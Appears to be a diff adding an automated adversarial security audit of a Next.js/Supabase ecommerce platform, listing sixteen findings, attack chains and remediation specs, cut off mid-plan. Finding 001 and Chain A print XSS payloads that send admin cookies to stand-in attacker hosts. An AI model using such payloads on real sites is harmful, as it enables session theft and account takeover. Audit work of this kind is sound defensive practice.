@@ -1,0 +1,1162 @@
+================================================================================
+  ZOVA ECOMMERCE — ADVERSARIAL SECURITY AUDIT REPORT
+================================================================================
+  Date           : 2026-04-27
+  Auditor        : Claude Code (automated adversarial review)
+  Project        : ZOVA Next.js 16 / Supabase ecommerce platform
+  Scope          : Full codebase — frontend, API routes, auth flows, payments,
+                   infrastructure config, dependencies, database schema
+================================================================================
+
+TABLE OF CONTENTS
+-----------------
+  1. Corrections to Initial Findings
+  2. Vulnerability Summary (Revised)
+  3. Detailed Findings
+  4. Attack Chains
+  5. Architectural Improvement Plans (Pre-Implementation Specs)
+  6. Remediation Priority Matrix
+
+
+================================================================================
+  SECTION 1 — CORRECTIONS TO INITIAL FINDINGS
+================================================================================
+
+The following items from the initial audit were revised after deeper code review
+and research. Each correction is explained.
+
+CORRECTION A — Next.js 16 proxy.js IS present and wired correctly
+  Initial finding stated: "No root middleware.js exists."
+  Actual state: Next.js 16 replaces middleware.js with proxy.js placed at the
+  project root. The file /proxy.js exists and correctly exports an async proxy()
+  function that calls updateSession(), which applies all security headers and
+  refreshes Supabase sessions. This is not a vulnerability.
+
+  Reference: Next.js 16 changed the middleware entrypoint from middleware.js
+  (root) to proxy.js (root), with the handler function renamed from middleware()
+  to proxy(). The project is correctly using this convention.
+
+  Status: FINDING REMOVED.
+
+CORRECTION B — Next.js version "16.0.10" IS a valid release
+  Initial finding flagged this as a non-standard version.
+  Actual state: Next.js 16 is a real release. The version is valid.
+  Status: FINDING REMOVED.
+
+CORRECTION C — STAFF role inventory adjustment is intentional
+  Initial finding flagged STAFF being able to adjust stock as a privilege
+  over-grant.
+  Actual state: This is a deliberate product decision. Store staff require
+  day-to-day stock management capability. This is accepted business risk.
+  Status: FINDING REMOVED.
+
+CORRECTION D — WhatsApp placeholder in legal pages is intentional (in progress)
+  Initial finding flagged the placeholder https://wa.me/234XXXXXXXXXX.
+  Actual state: This is a known placeholder pending real number assignment.
+  Status: DEFERRED. To be fixed before production launch.
+
+CORRECTION E — Webhook amount comparison is acceptable for NGN
+  Initial finding rated this MEDIUM, suggesting integer kobo storage.
+  Actual state: The orders.total_amount column is PostgreSQL NUMERIC type
+  (exact decimal, no floating-point representation error). All NGN prices on
+  this platform are whole-naira values or have at most 2 decimal places.
+  Math.round(Number(numeric_value) * 100) is deterministic and correct for
+  these inputs. The real issue is the MISSING UNIQUE CONSTRAINT on
+  orders.payment_reference, which is a separate finding (see Finding 007).
+  Status: SEVERITY DOWNGRADED. Unique constraint issue elevated to standalone
+  finding.
+
+CORRECTION F — PII traceability via user_id only (not phone/address)
+  Initial finding suggested logging only city/state for debugging.
+  Clarification: The activity_logs table already has a user_id column (UUID).
+  This is sufficient to trace any action to a specific person. Full delivery
+  address (including phone number and street address) must not appear in
+  activity_logs metadata under any circumstance. Joining user_id to the users
+  table provides all identity context when needed for investigation.
+  Status: CONFIRMED. Fix is to remove deliveryAddress from checkout log
+  metadata entirely.
+
+CORRECTION G — activity_logs RLS is already enabled
+  From migration 20260423_fix_remaining_security_warnings.sql:
+    ALTER TABLE IF EXISTS public.activity_logs ENABLE ROW LEVEL SECURITY;
+  No SELECT or INSERT policies exist for non-service-role access, meaning the
+  table is effectively locked to direct client access. All writes go through
+  the service-role admin client (writeActivityLog utility). This is correct
+  and intentional.
+  Status: CONFIRMED SAFE. Verify analytics_events has equivalent protection
+  (see Finding 008).
+
+
+================================================================================
+  SECTION 2 — VULNERABILITY SUMMARY (REVISED)
+================================================================================
+
+  Severity    Count
+  ─────────────────
+  Critical      2
+  High          5
+  Medium        6
+  Low           3
+  ─────────────────
+  Total        16
+
+
+================================================================================
+  SECTION 3 — DETAILED FINDINGS
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 001
+Title       : Content Security Policy Is Report-Only and Contains unsafe-inline
+Severity    : CRITICAL
+Component   : utils/supabase/middleware.js — buildReportOnlyCsp() — line 81
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The CSP header is set as Content-Security-Policy-Report-Only. The browser
+  logs violations but does NOT block anything. XSS payloads execute freely.
+
+  Additionally, the policy itself includes:
+    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.paystack.co ...
+
+  'unsafe-inline' allows inline <script> tags and event handlers.
+  'unsafe-eval' allows eval(), Function(), and setTimeout(string).
+  Even if the header were switched to enforcement mode today, these directives
+  would render the policy nearly useless against XSS.
+
+Exploitation scenario:
+  1. A malicious store member submits a product name containing:
+       <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+  2. That name renders in the admin panel (product review queue).
+  3. Because CSP is Report-Only AND contains unsafe-inline, the browser
+     executes the payload without restriction.
+  4. Admin session cookie is exfiltrated. Attacker logs in as admin.
+  5. Full platform takeover: approve any store, release escrow, access all
+     user records.
+
+Impact:
+  Full account takeover of any user whose browser renders attacker-controlled
+  content. Admin compromise results in complete platform breach.
+
+Recommended fix:
+  Phase 1 (immediate): Switch to Content-Security-Policy enforcement for all
+  directives except script-src (to avoid breaking Paystack). Keep script-src
+  Report-Only while you introduce nonces.
+
+  Phase 2 (within 1 sprint): Replace 'unsafe-inline' with a per-request nonce.
+  Next.js 16 supports nonces via the proxy/middleware layer. Paystack's inline
+  script can be wrapped with the nonce attribute. Remove 'unsafe-eval'.
+
+  Final policy target:
+    default-src 'self';
+    script-src 'self' 'nonce-{RANDOM}' https://js.paystack.co;
+    style-src  'self' 'unsafe-inline' https://fonts.googleapis.com;
+    object-src 'none';
+    frame-ancestors 'none';
+    base-uri 'self';
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 002
+Title       : Rate Limiting Fails Completely Open — All Guards Disabled
+Severity    : CRITICAL
+Component   : utils/platform/rate-limit.js — lines 23–25, 53–57
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  Two separate failure modes both result in rate limiting being completely
+  disabled:
+
+  Mode A — Redis not configured:
+    if (!redis) {
+      return { allowed: true, remaining: null, retryAfter: null };
+    }
+  If UPSTASH_REDIS_REST_URL or UPSTASH_REDIS_REST_TOKEN are absent or wrong,
+  the redis object is null and every request is unconditionally allowed.
+
+  Mode B — Redis connection error:
+    } catch (error) {
+      console.error('Rate limit error:', error);
+      // Fail-open if redis is unavailable to avoid full checkout outage.
+      return { allowed: true, remaining: null, retryAfter: null };
+    }
+  Any transient Redis failure (timeout, network blip, memory pressure) silently
+  disables ALL rate limits across checkout, auth, admin, and analytics.
+
+Exploitation scenario:
+  1. Attacker monitors the platform or deliberately exhausts Redis connections.
+  2. With rate limits gone, credential-stuffing against login runs at full
+     network speed (thousands of attempts per second).
+  3. Simultaneously, multiple checkout requests are fired for the same cart,
+     attempting race conditions on stock reservation.
+  4. Admin endpoints with no other throttle become bruteforceable.
+
+Impact:
+  Complete removal of the platform's only per-endpoint throttle. Every endpoint
+  that relies on rate limiting for security (auth, checkout, admin writes) is
+  simultaneously exposed.
+
+Recommended fix:
+  Implement an in-process fallback using a Node.js Map with sliding-window
+  counters. The fallback activates only when Redis is unavailable and uses
+  conservative limits (10% of normal). Alert immediately via logging when
+  fallback mode activates.
+
+  Example structure:
+    const fallbackCounters = new Map();
+    function fallbackCheck(key, limit, windowMs) {
+      const now = Date.now();
+      const entry = fallbackCounters.get(key) || { count: 0, resetAt: now + windowMs };
+      if (now > entry.resetAt) { entry.count = 0; entry.resetAt = now + windowMs; }
+      entry.count++;
+      fallbackCounters.set(key, entry);
+      return entry.count <= Math.floor(limit * 0.1); // 10% fallback limit
+    }
+
+  Also: expose a /api/admin/telemetry/health endpoint response that includes
+  Redis connectivity status so monitoring can alert on degradation.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 003
+Title       : Open Redirect via X-Forwarded-Host in Auth Callback (Production)
+Severity    : HIGH
+Component   : app/(auth)/auth/callback/route.js — lines 36–41
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  In production, the callback route trusts X-Forwarded-Host unconditionally:
+
+    const forwardedHost = request.headers.get('x-forwarded-host');
+    // ...
+    } else if (forwardedHost) {
+      return NextResponse.redirect(`https://${forwardedHost}${targetPath}`);
+    }
+
+  X-Forwarded-Host is a request header. Any HTTP client can set it to any
+  value. Deployments where the edge proxy does not strip this header before
+  forwarding to the Next.js origin allow an attacker to redirect post-login
+  users to an arbitrary domain.
+
+Exploitation scenario:
+  1. Attacker crafts a phishing email linking to the real Supabase OAuth URL.
+  2. OAuth flow completes legitimately; Supabase redirects to the callback.
+  3. Attacker's MITM proxy (or a manipulated link to a relay) sets:
+       X-Forwarded-Host: evil.com
+  4. User is redirected to https://evil.com/dashboard — a cloned ZOVA login
+     page that captures credentials or session tokens.
+  5. Authenticated users do not question the redirect since the OAuth flow
+     started on a legitimate page.
+
+Impact:
+  Post-authentication redirect to attacker-controlled domain. Session token
+  theft. Credential harvesting.
+
+Recommended fix:
+  Validate forwardedHost against an explicit allowlist:
+
+    const ALLOWED_HOSTS = new Set([
+      'zova.ng',
+      'www.zova.ng',
+      // add staging/preview domains explicitly
+    ]);
+
+    const forwardedHost = request.headers.get('x-forwarded-host');
+    const safeHost = forwardedHost && ALLOWED_HOSTS.has(forwardedHost)
+      ? forwardedHost
+      : null;
+
+    if (safeHost) {
+      return NextResponse.redirect(`https://${safeHost}${targetPath}`);
+    }
+    return NextResponse.redirect(`${origin}${targetPath}`);
+
+  Additionally, configure Cloudflare/your edge to strip X-Forwarded-Host
+  and replace it with the verified host header before it reaches the origin.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 004
+Title       : Full Delivery Address and Phone Number Written to Activity Logs
+Severity    : HIGH
+Component   : app/api/checkout/route.js — lines 262–275
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  On every checkout initiation, the full normalized delivery address object —
+  including the buyer's phone number, street address, city, and state — is
+  written as structured metadata into activity_logs:
+
+    metadata: {
+      orderId,
+      itemsCount: authoritativeOrder.items.length,
+      total: authoritativeOrder.total,
+      addressMode: ...,
+      saveAddress: ...,
+      deliveryAddress: normalizedDeliveryAddress,  // <-- phone, address, city, etc.
+    },
+
+  Traceability only requires user_id, which is already a top-level field in
+  activity_logs. The physical address adds no investigative value and
+  significantly expands the blast radius of any log access breach.
+
+Impact:
+  Every checkout since the app launched has deposited a buyer's home address
+  and phone number into a general-purpose audit log table. A misconfigured RLS
+  policy, an insider with DB read access, or a SQL injection against activity_logs
+  exposes this data for every customer.
+
+Recommended fix:
+  Remove deliveryAddress from the metadata entirely. The activity_log already
+  records user_id; joining that to the users or order_shipping_addresses table
+  provides full address context during any legitimate investigation.
+
+  Replace:
+    metadata: { orderId, ..., deliveryAddress: normalizedDeliveryAddress }
+  With:
+    metadata: { orderId, itemsCount, total, addressMode, saveAddress: Boolean(saveAddress) }
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 005
+Title       : IP Header Spoofing Bypasses Per-IP Rate Limit Dimension
+Severity    : HIGH
+Component   : utils/platform/rate-limit.js — lines 3–13, 29
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The rate limit key is: ratelimit:{scope}:{identifier}:{ip}
+
+  The IP is extracted from X-Forwarded-For by taking the FIRST value:
+    const forwardedFor = request.headers.get('x-forwarded-for');
+    if (forwardedFor) {
+      return forwardedFor.split(',')[0]?.trim() || 'unknown';
+    }
+
+  Any client can set X-Forwarded-For: 1.2.3.4 to impersonate an arbitrary IP.
+  For endpoints that use IP as their identifier (unauthenticated analytics
+  events, webhook ingestion keyed to literal "webhook"), the rate limit key
+  changes on every request, making per-key counters useless.
+
+  The webhook endpoint is also rate-limited against identifier 'webhook', but
+  the IP component can be spoofed, allowing flooding that key.
+
+Impact:
+  Rate limits on unauthenticated endpoints are trivially bypassed. Analytics
+  flooding (Finding: separate analytics path) becomes easier.
+
+Recommended fix:
+  When behind Cloudflare, use cf-connecting-ip exclusively and refuse to
+  process X-Forwarded-For (which Cloudflare replaces with its own verified
+  value). Configure the edge to strip and re-write the header:
+
+    // In getRequestIp:
+    const cfIp = request.headers.get('cf-connecting-ip');
+    if (cfIp) return cfIp; // Trusted: set by Cloudflare, cannot be spoofed
+
+  Do not fall back to x-forwarded-for when cf-connecting-ip is present.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 006
+Title       : Client-Submitted Analytics Events Directly Influence Product Ranking
+Severity    : HIGH
+Component   : app/api/analytics/events/route.js + product ranking engine
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The /api/analytics/events POST endpoint accepts events from any caller —
+  authenticated users, anonymous sessions, or raw IPs. Events are written
+  directly to analytics_events via the admin client without cross-referencing
+  whether the event reflects a real user action.
+
+  Meanwhile, the webhook route logs order_placed events to product_events,
+  which feed the ranking engine's revenue_30d signals. The analytics_events
+  table can receive arbitrary event_name values (constrained only to
+  /^[a-z0-9_]{2,64}$/i) and arbitrary properties JSON up to 8000 characters.
+
+  An attacker scripting 600 product_view or add_to_cart events per minute —
+  per the rate limit — can inject false demand signals for any product.
+
+Impact:
+  Organic product rankings are manipulated. Competitor products can be
+  suppressed or fraudulently boosted. The ranking engine's integrity degrades
+  in proportion to the volume of fake events.
+
+Recommended fix:
+  See Section 5 — Architectural Improvement Plan A for the full specification
+  of separating client analytics from ranking signals.
+
+  Short-term: add an allowlist of valid client event names and reject anything
+  not in that list. Add a stricter rate limit for anonymous callers (10/min
+  vs. 600/min for authenticated).
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 007
+Title       : orders.payment_reference Has No UNIQUE Constraint
+Severity    : HIGH
+Component   : Database schema — orders table, app/api/paystack/webhook/route.js
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The orders table defines payment_reference as a nullable text column with
+  no uniqueness constraint:
+    payment_reference text NULL   (no UNIQUE, no index)
+
+  The webhook route does implement an application-level idempotency check:
+    .eq('id', orderId)
+    .eq('status', 'pending')
+    .is('payment_reference', null)
+
+  But this is a non-atomic check-then-set. Under concurrent webhook delivery
+  (Paystack can send the same event multiple times), two simultaneous requests
+  can both pass the NULL check before either commits the update, resulting in
+  two attempts to mark the same order completed. The second write has no
+  constraint to stop it if the first write hasn't committed yet (Supabase uses
+  MVCC snapshot isolation; without a unique constraint, both can succeed).
+
+  store_payouts.paystack_reference does have a UNIQUE constraint (from
+  migration 2026-03-20_store_console_escrow.sql), confirming this asymmetry
+  is an oversight on the orders table.
+
+Exploitation scenario:
+  1. Paystack delivers a charge.success webhook twice within milliseconds
+     (retry after a network timeout — this is standard Paystack behaviour).
+  2. Both requests hit the verification path concurrently.
+  3. Both pass the .is('payment_reference', null) check simultaneously.
+  4. Both attempt to mark the order completed and trigger escrow funding.
+  5. Duplicate escrow_transactions rows are created; escrow is funded twice.
+  6. Store receives double payout for a single sale.
+
+Impact:
+  Financial loss (double escrow funding) and data integrity corruption.
+
+Recommended fix:
+  Add a unique constraint at the database level:
+    ALTER TABLE public.orders
+      ADD CONSTRAINT orders_payment_reference_unique
+      UNIQUE (payment_reference);
+
+  This ensures only one webhook can ever set a given reference, regardless of
+  concurrency. The existing application-level check remains as defence-in-depth.
+
+  Also add a partial unique index to prevent two NULL references colliding:
+    CREATE UNIQUE INDEX orders_payment_reference_unique_idx
+      ON public.orders (payment_reference)
+      WHERE payment_reference IS NOT NULL;
+
+  Note on amount comparison: The existing Math.round(Number(numeric) * 100)
+  approach is correct and safe for NGN amounts (whole naira, 2 decimal max).
+  No change required there.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 008
+Title       : analytics_events Table Lacks Row Level Security
+Severity    : MEDIUM
+Component   : Database schema — analytics_events table
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  Migration 20260423_fix_remaining_security_warnings.sql explicitly enables RLS
+  on activity_logs, product_images, product_job_runs, and other internal tables.
+  analytics_events is NOT in that list and does not appear in any RLS migration.
+
+  This means any authenticated Supabase client (or anonymous client if the
+  table was previously accessible) can SELECT all rows from analytics_events,
+  revealing the browsing and purchase-intent behaviour of every user: which
+  products they viewed, what they added to cart, what they searched for, and
+  from which paths.
+
+Impact:
+  User behavioural privacy breach. Competitive intelligence exposure (a rival
+  seller or researcher can extract the platform's top-viewed products and
+  conversion patterns).
+
+Recommended fix:
+  Add to a new migration:
+    ALTER TABLE public.analytics_events ENABLE ROW LEVEL SECURITY;
+    -- No SELECT policies: table is write-only from client, read via service-role only.
+
+  All reads of analytics_events in admin dashboards and ranking jobs should
+  use the service-role admin client (already the case for existing routes).
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 009
+Title       : Inventory History Fetches 200 Global Records, Filters Client-Side
+Severity    : MEDIUM
+Component   : app/api/store/inventory/route.js — lines 262–276
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The inventory history loader fetches the 200 most recent INVENTORY_ADJUSTMENT
+  log entries globally (across all stores) and then filters in JavaScript:
+
+    const historyResult = await ctx.adminClient
+      .from('activity_logs')
+      .select('id, created_at, action, message, user_id, metadata')
+      .eq('action', 'INVENTORY_ADJUSTMENT')
+      .order('created_at', { ascending: false })
+      .limit(200);
+
+    history = (historyResult.data || [])
+      .filter((entry) =>
+        String(entry?.metadata?.store_id || '') === String(ctx.membership.store_id)
+      )
+
+  Problems:
+  1. On a busy platform the 200-row window may not contain any records for the
+     requesting store, so stores with lower activity see no history despite
+     having records.
+  2. All 200 raw records (including other stores' metadata) are fetched into
+     the Next.js process memory before being filtered — information is transiently
+     available to the server process and any memory dump.
+  3. A logic bug (null store_id in metadata, serialization mismatch) would
+     silently show another store's inventory history.
+
+Impact:
+  Data integrity failure (wrong history shown), information leakage (transient
+  cross-store data in server memory).
+
+Recommended fix:
+  Filter at the database level using Supabase JSONB operators:
+    .filter('metadata->>store_id', 'eq', ctx.membership.store_id)
+
+  Full fixed query:
+    const historyResult = await ctx.adminClient
+      .from('activity_logs')
+      .select('id, created_at, action, message, user_id, metadata')
+      .eq('action', 'INVENTORY_ADJUSTMENT')
+      .filter('metadata->>store_id', 'eq', ctx.membership.store_id)
+      .order('created_at', { ascending: false })
+      .limit(30);
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 010
+Title       : Error Responses Leak Database Schema via Migration Hint Strings
+Severity    : MEDIUM
+Component   : app/api/reviews/route.js:7, app/api/account/orders/[id]/cancel/route.js:5
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  When a database schema error is encountered, the full migration hint string
+  is returned to the API caller:
+
+    const REVIEWS_MIGRATION_HINT =
+      'Database is missing the hardened review columns. Apply
+       documentation/migrations/2026-04-10_marketplace_ops_extensions.sql and retry.';
+
+    const MISSING_TABLE_HINT =
+      'Database is missing public.order_cancellation_requests. Apply
+       documentation/migrations/2026-04-09_order_cancellation_requests.sql and retry.';
+
+  These strings expose: internal directory structure, exact table names, exact
+  column names, migration dates, and the fact that migrations may not have
+  been applied (signals infrastructure maturity to an attacker).
+
+Impact:
+  An attacker learns the exact database schema, table names, and file structure
+  without any authentication. This significantly assists SQL injection attempts
+  and targeted data extraction.
+
+Recommended fix:
+  Return generic messages to callers; log the detailed hint server-side only:
+    // Return to caller:
+    return NextResponse.json({ error: 'Service temporarily unavailable.' }, { status: 503 });
+    // Log internally:
+    console.error('[schema-error]', REVIEWS_MIGRATION_HINT);
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 011
+Title       : Checkout Route Leaks Internal RPC Error Details to Browser
+Severity    : MEDIUM
+Component   : app/api/checkout/route.js — lines 233–236
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  Supabase RPC error messages from checkout_transaction are returned verbatim
+  to the browser:
+    return NextResponse.json({ error: error.message }, { status: 400 });
+
+  PostgreSQL error messages can expose stored procedure internals, constraint
+  names, column names, and data types. For example:
+    "violates check constraint 'stock_quantity_non_negative' on table 'products'"
+
+Impact:
+  Database schema reconnaissance. Assists injection attack crafting.
+
+Recommended fix:
+  Map known error patterns to user-friendly strings:
+    const KNOWN_ERRORS = {
+      'Insufficient stock': 'One or more items in your cart are out of stock.',
+      'Cart is empty':      'Your cart is empty.',
+    };
+    const userMsg = Object.entries(KNOWN_ERRORS)
+      .find(([key]) => error.message.includes(key))?.[1]
+      ?? 'Checkout failed. Please try again.';
+    return NextResponse.json({ error: userMsg }, { status: 400 });
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 012
+Title       : Review Verification Queries Order Items Without User Scope Guard
+Severity    : MEDIUM
+Component   : app/api/reviews/route.js — findVerifiedPurchase() — lines 34–43
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The first query in findVerifiedPurchase does not filter by user_id:
+    const { data: orderItems, error } = await supabase
+      .from('order_items')
+      .select('order_id, product_id')
+      .eq('product_id', productId)
+      .limit(200);
+
+  It fetches up to 200 order_items rows for the product from any order,
+  then checks if any of those orders belong to the requesting user. This
+  relies entirely on Supabase RLS on order_items being correctly scoped.
+
+  If the RLS policy on order_items ever allows SELECT for authenticated role
+  without a user_id filter (a common misconfiguration), an authenticated user
+  could fabricate a verified-buyer review for a product they never purchased.
+
+Impact:
+  Fraudulent verified-purchase reviews. Trust signal manipulation. Reputation
+  damage to sellers.
+
+Recommended fix:
+  JOIN at the query level instead of two separate round-trips:
+    const { data: verifiedItems } = await supabase
+      .from('order_items')
+      .select('order_id, orders!inner(id, user_id, status, fulfillment_status)')
+      .eq('product_id', productId)
+      .eq('orders.user_id', user.id)
+      .in('orders.fulfillment_status', ['delivered', 'delivered_confirmed'])
+      .limit(1);
+    return verifiedItems?.[0] ? verifiedItems[0].orders : null;
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 013
+Title       : Middleware Route Guard Does Not Cover /store/* or /admin/*
+Severity    : MEDIUM
+Component   : utils/supabase/middleware.js — lines 128–142
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  The proxy.js middleware only guards four path prefixes: /profile, /orders,
+  /payments, /settings. The store console (/store/*) and admin panel (/admin/*)
+  are not included. Protection relies entirely on individual page-level calls
+  to requireStorePage() / requireAdminPage().
+
+  Any new page added to these namespaces without a server-side auth call silently
+  becomes publicly accessible. This is a systemic fragility in the auth posture.
+
+Impact:
+  Accidental public exposure of store management or admin pages through developer
+  error. No defence-in-depth for the highest-privilege areas of the application.
+
+Recommended fix:
+  Add /store and /admin to the middleware guard:
+    if (!user && (
+      request.nextUrl.pathname.startsWith('/profile') ||
+      request.nextUrl.pathname.startsWith('/orders')  ||
+      request.nextUrl.pathname.startsWith('/payments')||
+      request.nextUrl.pathname.startsWith('/settings')||
+      request.nextUrl.pathname.startsWith('/store')   ||   // ADD
+      request.nextUrl.pathname.startsWith('/admin')        // ADD
+    )) { ... }
+
+  This is defence-in-depth. Page-level checks (requireStorePage) remain as the
+  primary guard; middleware is the fallback.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 014
+Title       : Deprecated @supabase/auth-helpers-nextjs Co-Installed with @supabase/ssr
+Severity    : LOW
+Component   : package.json
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  Both @supabase/auth-helpers-nextjs (deprecated, EOL) and @supabase/ssr
+  (its replacement) are listed as production dependencies. These packages manage
+  auth session cookies with incompatible mechanisms. If any code path uses
+  auth-helpers instead of ssr, session state may be inconsistent — causing
+  phantom auth states or silent session loss.
+
+Impact:
+  Sporadic authentication failures. Potential session confusion under load.
+
+Recommended fix:
+  Run: grep -r "auth-helpers-nextjs" src/ app/ components/ utils/
+  Confirm no imports remain. Then:
+    npm uninstall @supabase/auth-helpers-nextjs
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 015
+Title       : Both ioredis and @upstash/redis Installed as Production Dependencies
+Severity    : LOW
+Component   : package.json
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  Two Redis client libraries are listed: ioredis (traditional TCP client) and
+  @upstash/redis (HTTP-based, serverless-compatible). Only one can be the
+  active client. The unused library increases the attack surface (supply chain
+  risk) and bundle size.
+
+Impact:
+  Supply chain risk from unused dependency. Potential connection confusion
+  if both are instantiated.
+
+Recommended fix:
+  Determine which client utils/platform/redis.js actually uses, then remove the
+  other from package.json and the lockfile.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FINDING 016
+Title       : requireAdminApi() Called Without Role Argument on Admin GETs
+Severity    : LOW
+Component   : app/api/admin/stores/[id]/route.js — line 33 (and similar GET handlers)
+────────────────────────────────────────────────────────────────────────────────
+
+Description:
+  Several admin GET routes call requireAdminApi() with no requiredRoles:
+    const admin = await requireAdminApi(); // any admin role passes
+
+  When requiredRoles is empty, hasRole() returns true for any role including
+  ANALYST (read-only). An ANALYST can therefore call endpoints that may return
+  sensitive aggregates or reveal internal data intended only for OPS_ADMIN or
+  SUPER_ADMIN.
+
+Impact:
+  Horizontal privilege escalation within the admin tier. Lower-privileged admin
+  accounts can access data above their clearance.
+
+Recommended fix:
+  Explicitly declare minimum read roles for every admin endpoint:
+    const admin = await requireAdminApi([ADMIN_ROLES.ANALYST, ADMIN_ROLES.OPS_ADMIN, ADMIN_ROLES.SUPER_ADMIN]);
+  For write endpoints (already correct in most cases):
+    const admin = await requireAdminApi([ADMIN_ROLES.OPS_ADMIN, ADMIN_ROLES.SUPER_ADMIN]);
+
+
+================================================================================
+  SECTION 4 — ATTACK CHAINS
+================================================================================
+
+CHAIN A — Stored XSS → Admin Session Takeover → Platform Breach
+  (Findings 001 + 010 + 013)
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │ 1. Attacker registers as a store (free) and lists a product with    │
+  │    a name containing a JavaScript payload:                          │
+  │      <img src=x onerror="fetch('//c2.attacker.com/?c='+btoa(       │
+  │        document.cookie))">                                          │
+  │ 2. Admin reviews the product in the admin panel (product review     │
+  │    queue). The name renders in the DOM.                             │
+  │ 3. CSP is Report-Only + unsafe-inline → payload executes.          │
+  │ 4. Admin cookie exfiltrated to attacker's server.                  │
+  │ 5. Attacker uses admin session to:                                  │
+  │      - Approve any store and bypass KYC                             │
+  │      - Release escrow funds prematurely                             │
+  │      - Export all user records                                      │
+  │      - Extract activity logs (which contain delivery addresses)     │
+  │    Error strings (Finding 010) confirm exact table names to assist  │
+  │    any further targeted exploitation.                               │
+  └─────────────────────────────────────────────────────────────────────┘
+  Combined severity: CRITICAL
+
+CHAIN B — Redis Outage + IP Spoofing → Credential Stuffing + Checkout Fraud
+  (Findings 002 + 005)
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │ 1. Attacker deliberately exhausts Redis connections (e.g., opening  │
+  │    many simultaneous connections to the Redis endpoint).            │
+  │ 2. Rate limit fails open — all limits disabled (Finding 002).       │
+  │ 3. Attacker scripts credential stuffing against /api/auth at full   │
+  │    speed, rotating X-Forwarded-For headers to appear as different   │
+  │    IPs even when Redis is restored (Finding 005).                   │
+  │ 4. Compromised account used to hammer checkout (20 req/60s limit    │
+  │    also disabled during Redis outage).                              │
+  │ 5. Race condition on checkout_transaction RPC may allow same cart   │
+  │    to be checked out twice before stock lock triggers.              │
+  └─────────────────────────────────────────────────────────────────────┘
+  Combined severity: HIGH
+
+CHAIN C — Analytics Poisoning → Competitor Ranking Manipulation
+  (Finding 006 + Finding 005)
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │ 1. Attacker authenticates as a store owner.                         │
+  │ 2. Scripts 600/min product_view events for competitor products with │
+  │    high bounce metadata (session_id varied), spoofing IP to bypass  │
+  │    the IP dimension of rate limiting (Finding 005).                 │
+  │ 3. Competitor products accumulate false negative signals.           │
+  │ 4. Attacker submits their own products with inflated positive        │
+  │    signals (add_to_cart, wishlist_add).                             │
+  │ 5. Ranking engine promotes attacker's products; competitor products │
+  │    drop in organic ranking within 30-day rolling window.            │
+  │ 6. No server-side validation that events correspond to real user    │
+  │    actions prevents this indefinitely.                              │
+  └─────────────────────────────────────────────────────────────────────┘
+  Combined severity: HIGH
+
+CHAIN D — Concurrent Webhook Delivery → Double Escrow Funding
+  (Finding 007)
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │ 1. Paystack network retry delivers charge.success twice within ms.  │
+  │ 2. Both requests pass signature verification.                       │
+  │ 3. Both read order.status = 'pending' and payment_reference = NULL  │
+  │    before either transaction commits (MVCC snapshot isolation).     │
+  │ 4. Both update the order to 'completed'.                            │
+  │ 5. Both trigger ensureEscrowFundedForOrder.                         │
+  │ 6. Escrow funded twice for one order. Store receives double payout. │
+  └─────────────────────────────────────────────────────────────────────┘
+  Combined severity: HIGH (financial integrity)
+
+
+================================================================================
+  SECTION 5 — ARCHITECTURAL IMPROVEMENT PLANS (PRE-IMPLEMENTATION SPECS)
+================================================================================
+
+These are detailed specifications for implementing the six architectural
+improvements. Each plan covers what to build, where it lives, and what
+migrations or schema changes are required. Implementation follows this
+document.
+
+────────────────────────────────────────────────────────────────────────────────
+PLAN A — Separate Analytics Write Path from Ranking Signals
+────────────────────────────────────────────────────────────────────────────────
+
+Problem:
+  Client-submitted analytics events (browser → /api/analytics/events) are
+  written to analytics_events via the admin client. This path is also the
+  primary input for product_events, which the ranking engine reads to compute
+  revenue_30d and view signals. An attacker can inject false signals freely.
+
+Design:
+  Split the analytics pipeline into two separate paths:
+
+  Path 1 — Client telemetry (untrusted):
+    • Endpoint: /api/analytics/events (existing)
+    • Writes to: analytics_events ONLY
+    • analytics_events is used for DASHBOARDS only (admin view, store view)
+    • analytics_events NEVER feeds the ranking engine
+    • Events are validated against an ALLOWED_EVENT_NAMES server-side allowlist
+
+  Path 2 — Ranking signals (server-authorised only):
+    • product_events table is written ONLY from:
+        a. Paystack webhook handler (order_placed — already server-side)
+        b. A new internal /api/internal/ranking-signal endpoint, callable only
+           by Next.js server code (not exposed to browser) using the service role
+    • product_events NEVER accepts direct browser writes
+    • Disable any existing RLS INSERT policy on product_events for anon/authenticated
+      roles. Service-role only.
+
+  New server action for server-side ranking signal ingestion:
